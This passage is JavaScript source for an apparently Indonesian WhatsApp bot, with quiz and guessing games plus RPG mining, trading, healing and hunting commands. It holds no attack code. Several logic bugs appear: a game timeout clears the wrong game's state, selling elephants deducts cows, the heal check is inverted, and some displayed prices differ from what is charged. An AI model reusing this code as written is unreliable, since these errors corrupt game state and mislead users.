str: `${a} ${operators[op]} ${b}`,
mode,
time,
bonus,
result
}
}
function randomInt(from, to) {
if (from > to) [from, to] = [to, from]
from = Math.floor(from)
to = Math.floor(to)
return Math.floor((to - from) * Math.random() + from)
}
if (!q) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let mode = args[0].toLowerCase()
if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let id = from
if (id in Fan.math) return setReply('Masih ada soal belum terjawab di chat ini')
let math2 = genMath(mode)
Fan.math[id] = [
await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: ${math2.bonus} XP`),
math2, 4,
setTimeout(async () => {
//if (Fan.math[id]) await Fan.sendButton(from, `Waktu habis!\nJawabannya adalah ${math2.result}`, '', `${math2.mode.toUpperCase()}`, `.math ${math2.mode}`, conn.math[id][0])
if (Fan.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
delete Fan.math[id]
}, math2.time)
]
}
break
case 'tebakkabupaten':{
if (_tebakkabupaten.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakkabupaten
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.title
let gambar = data.url
let teks = `*TEBAK KABUPATEN*\n\nApa nama kabupaten dari lambang tersebut!\nWaktu : ${gamewaktu}s`
_tebakkabupaten[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tebakkabupaten.json", JSON.stringify(_tebakkabupaten))
Fan.sendMessage(from, { image: { url: gambar }, caption: teks }, { quoted: setQuoted })
await sleep(_tebakkabupaten[sender.split('@')[0]].time)
if (_tebakkabupaten.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakanime[sender.split('@')[0]]
fs.writeFileSync("./database/game/tebakkabupaten.json", JSON.stringify(_tebakkabupaten)) 
}
}
break
case 'tebakanime':{
if (_tebakanime.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung") 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakanime
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let gambar = data.image
let japan = data.name_jp
let teks = `*TEBAK ANIME*\n\nSiapa nama Karakter pada gambar tersebut!\n${japan}\nWaktu : ${gamewaktu}s`
_tebakanime[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tebakanime.json", JSON.stringify(_tebakanime))
Fan.sendMessage(from, { image: { url: gambar }, caption: teks }, { quoted: setQuoted })
await sleep(_tebakanime[sender.split('@')[0]].time)
if (_tebakanime.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakanime[sender.split('@')[0]]
fs.writeFileSync("./database/game/tebakanime.json", JSON.stringify(_tebakanime))
}
}
break
case 'tebakbendera':{
if (_tebakbendera.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakbendera
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.name
let gambar = data.img
let teks = `*TEBAK BENDERA*\n\nApa nama bendera pada gambar tersebut!\nWaktu : ${gamewaktu}s`
_tebakbendera[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tebakbendera.json", JSON.stringify(_tebakbendera))
Fan.sendMessage(from, { image: { url: gambar }, caption: teks }, { quoted: setQuoted })
await sleep(_tebakbendera[sender.split('@')[0]].time)
if (_tebakbendera.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakbendera[sender.split('@')[0]]
fs.writeFileSync("./database/game/tebakbendera.json", JSON.stringify(_tebakbendera))
}
}
break
case 'caklontong':{
if (_caklontong.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = caklontong
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let desk = data.deskripsi
let teks = `𝗖𝗔𝗞 𝗟𝗢𝗡𝗧𝗢𝗡𝗚\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s`
_caklontong[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/caklontong.json", JSON.stringify(_caklontong))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_caklontong[sender.split('@')[0]].time)
if (_caklontong.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: `${jawaban}\n\n${desk}`, mentions: [sender] },
{ quoted : setQuoted }) 
delete _caklontong[sender.split('@')[0]]
fs.writeFileSync("./database/game/caklontong.json", JSON.stringify(_caklontong))
}
}
break
case 'tebaklagu':{
if (_tebaklagu.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")  
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta =  tebaklagu
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.title
let soal = data.artists
let songs = data.songs
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗟𝗔𝗚𝗨\n_Apa Nama Judulnya_\n*Artist:* ${soal}\n\nWaktu : ${gamewaktu}s`
_tebaklagu[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tebaklagu.json", JSON.stringify(_tebaklagu))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await Fan.sendMessage(from, { audio: {url : songs }, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
await sleep(_tebaklagu[sender.split('@')[0]].time)
if (_tebaklagu.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebaklagu[sender.split('@')[0]]
fs.writeFileSync("./database/game/tebaklagu.json", JSON.stringify(_tebaklagu))
}
}
break
case 'tebaklirik':{
if (_tebaklirik.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta =  tebaklirik
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗟𝗜𝗥𝗜𝗞\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s`
_tebaklirik[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tebaklirik.json", JSON.stringify(_tebaklirik))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tebaklirik[sender.split('@')[0]].time)
if (_tebaklirik.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebaklirik[sender.split('@')[0]]
fs.writeFileSync("./database/game/tebaklirik.json", JSON.stringify(_tebaklirik))
}
}
break
case 'tekateki':{
if (_tekateki.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tekateki
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let teks = `𝗧𝗘𝗞𝗔 𝗧𝗘𝗞𝗜;\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s`
_tekateki[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tekateki.json", JSON.stringify(_tekateki))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tekateki[sender.split('@')[0]].time)
if (_tekateki.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tekateki[sender.split('@')[0]]
fs.writeFileSync("./database/game/tekateki.json", JSON.stringify(_tekateki)) 
}
}
break
case 'tebakkalimat':{
if (_tebakkalimat.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakkalimat
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let hint = data.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗞𝗔𝗟𝗜𝗠𝗔𝗧;\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s\nHint : ${hint}`
_tebakkalimat[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tebakkalimat.json", JSON.stringify(_tebakkalimat))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tebakkalimat[sender.split('@')[0]].time)
if (_tebakkalimat.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakkalimat[sender.split('@')[0]]
fs.writeFileSync("./database/game/tebakkalimat.json", JSON.stringify(_tebakkalimat))
}
}
break
case 'susunkata':{
if (_susunkata.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = susunkata
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let tipe = data.tipe
let teks = `𝗦𝗨𝗦𝗨𝗡 𝗞𝗔𝗧𝗔;\n\n*Soal :* ${soal}\n*Tipe :* ${tipe}\n\nWaktu : ${gamewaktu}s`
_susunkata[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/susunkata.json", JSON.stringify(_susunkata))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_susunkata[sender.split('@')[0]].time)
if (_susunkata.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _susunkata[sender.split('@')[0]]
fs.writeFileSync("./database/game/susunkata.json", JSON.stringify(_susunkata))
}
}
break
case 'asahotak':{
if (_asahotak.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = asahotak
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let teks = `𝗔𝗦𝗔𝗛 𝗢𝗧𝗔𝗞\n\n*Soal :* ${soal}adalah\n\nWaktu : ${gamewaktu}s`
_asahotak[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/asahotak.json", JSON.stringify(_asahotak))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_asahotak[sender.split('@')[0]].time)
if (_asahotak.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _asahotak[sender.split('@')[0]]
fs.writeFileSync("./database/game/asahotak.json", JSON.stringify(_asahotak))
}
}
break
case 'tebakkimia':{
if (_tbkkimia.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakkimia
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.lambang
let unsur = data.unsur
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗞𝗜𝗠𝗜𝗔\n\nLambang unsur dari ${unsur} adalah\nWaktu : ${gamewaktu}s`
_tbkkimia[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./database/game/tebakkimia.json", JSON.stringify(_tbkkimia))
Fan.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tbkkimia[sender.split('@')[0]].time)
if (_tbkkimia.hasOwnProperty(sender.split('@')[0])) {
Fan.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tbkkimia[sender.split('@')[0]]
fs.writeFileSync("./database/game/tebakkimia.json", JSON.stringify(_tbkkimia)) 
}
}
break
//━━━━━━━━━━━━━━━[ RPG ]━━━━━━━━━━━━━━━━━//	  	  	  
case 'leaderboard':
{      
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟Ikan* : ${i.ikan}\n`
txt += `*🐔Ayam* : ${i.ayam}\n`
txt += `*🐇Kelinci* : ${i.kelinci}\n`
txt += `*🐑Domba* : ${i.domba}\n`
txt += `*🐄Sapi* : ${i.sapi}\n`
txt += `*🐘Gajah* : ${i.gajah}\n\n`
}
setReply(txt)       
}
break
case 'mining': case 'menambang':{
if (!isInventory){ addInventori(sender) }
if (isCekDarah < 1) return setReply('Kamu kelelahan!, cobalah heal menggunakan potion') 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]  
var emasnya = emas[Math.floor(Math.random() * emas.length)]  
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
setTimeout( () => {
let caption = `[ HASIL MENAMBANG ]\n*Besi* : ${besinya}\n*Emas* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
{
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang lagi⛏️'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: './media/image/rpg/tambang.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
Fan.sendMessage(from, buttonMessage, { quoted: setQuoted })  
}, 7000)  
setTimeout( () => {
setReply(`@${sender.split("@")[0]} Mulai menambang🎣`)     
}, 1500)
kurangDarah(sender, 10)
addBesi(sender, besinya)
addEmas(sender, emasnya)
addEmerald(sender, emeraldnya)	     
}   
break  
case 'beli': case 'buy':{
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
if (!isInventoryMonay){ addInventoriMonay(sender) }
if (!isInventory){ addInventori(sender) }
if (!q) return setReply('Mau beli apa?\n*Berikut listnya*\n> potion\n> umpan\n> limit')
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} potion 2\n 1 potion = 100000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(sender, noh)
var apalu = anu * 1
addPotion(sender, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(sender)}\n*Potion kamu* : ${getPotion(sender)}`)
}, 2000) 
} else 
if (args[0] === 'umpan'){
let noh = 5000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} umpan 2\n 1 umpan = 2500 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(sender, noh)
var apalu = anu * 1
addUmpan(sender, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(sender)}\n*Umpan kamu* : ${getUmpan(sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} limit 2\n 1 limit = 35000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(sender, noh)
var apalu = anu * 1
addInventoriLimit(sender, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(sender)}\n*Limit kamu* : ${getLimit(sender)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'sel': case 'jual':{//BY LORD RIFZA
if (!q) return setReply(`Mau jual apa?\n*Kamu bisa yang ada di list berikut*\n> ikan\n> ayam\n> kelinci\n> domba\n> sapi\n> gajah\n> besi\n> emas\n> emerald`)
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
if (!isInventoryMonay){ addInventoriMonay(sender) }
if (!isInventory){ addInventori(sender) }
var anu = args[1]
if (args[0] === 'ikan'){
if (isIkan < anu) return setReply('Ikan kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ikan 2\n 1 ikan = 1500 monay`)
kurangIkan(sender, anu)
let monaynya = 1500 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Ikan kamu* : ${getIkan(sender)}`)
}, 2000) 
} else
if (args[0] === 'ayam'){
if (isAyam < anu) return setReply('Ayam kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ayam 2\n 1 ayam = 2500 monay`)
kurangAyam(sender, anu)
let monaynya = 2500 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Ayam kamu* : ${getAyam(sender)}`)
}, 2000) 
} else
if (args[0] === 'kelinci'){
if (isKelinci < anu) return setReply('Kelinci kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} kelinci 2\n 1 kelinci = 3000 monay`)
kurangKelinci(sender, anu)
let monaynya = 3000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Kelinci kamu* : ${getKelinci(sender)}`)
}, 2000) 
} else
if (args[0] === 'domba'){
if (isDomba < anu) return setReply('Domba kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} domba 2\n 1 domba = 5000 monay`)
kurangDomba(sender, anu)
let monaynya = 5000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Domba kamu* : ${getDomba(sender)}`)
}, 2000) 
} else
if (args[0] === 'sapi'){
if (isSapi < anu) return setReply('Sapi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} sapi 2\n 1 sapi = 10000 monay`)
kurangSapi(sender, anu)
let monaynya = 10000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Sapi kamu* : ${getSapi(sender)}`)
}, 2000) 
} else
if (args[0] === 'gajah'){
if (isGajah < anu) return setReply('Gajah kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} gajah 2\n 1 gajah = 15000 monay`)
kurangSapi(sender, anu)
let monaynya = 15000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Gajah kamu* : ${getGajah(sender)}`)
}, 2000) 
} else
if (args[0] === 'besi'){
if (isBesi < anu) return setReply('Besi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} besi 2\n 1 besi = 15000 monay`)
kurangBesi(sender, anu)
let monaynya = 16000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Besi kamu* : ${getBesi(sender)}`)
}, 2000) 
} else
if (args[0] === 'emas'){
if (isEmas < anu) return setReply('Emas kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emas 2\n 1 emas = 50000 monay`)
kurangEmas(sender, anu)
let monaynya = 50000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa emas kamu* : ${getEmas(sender)}`)
}, 2000) 
} else
if (args[0] === 'emerald'){
if (isEmerald < anu) return setReply('Emerald kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emerald 2\n 1 emerald = 100000 monay`)
kurangEmerald(sender, anu)
let monaynya = 100000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa emerald kamu* : ${getEmerald(sender)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'heal':{
if (!isCekDarah < 1) return setReply('Kamu hanya bisa heal ketika darah kamu 0')
if (isCekDarah > 100) return setReply('Darah kamu sudah penuh')
if (isPotion < 1) return setReply('Kamu tidak punya potion, cobalah beli dengan cara #buypotion _jumlah_') 
addDarah(sender, 100)
kurangPotion(sender, 1)
setReply('Berhasil, darah kamu sudah full')
}
break
case 'berburu':{
if (!isDarah){ addInventoriDarah(sender, DarahAwal) }
if (isCekDarah < 1) return setReply('Darah kamu habis, cobalah heal menggunakan potion') 
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
let luka = ["Tertusuk duri saat berburu","Terpeleset ke jurang saat berburu","Tercakar hewan buas","Tidak berhati-hati","Terjerat akar","Terjatuh saat berburu"]
let location = ["Hutan rimba","Hutan Amazon","Hutan tropis","Padang rumput","Hutan afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
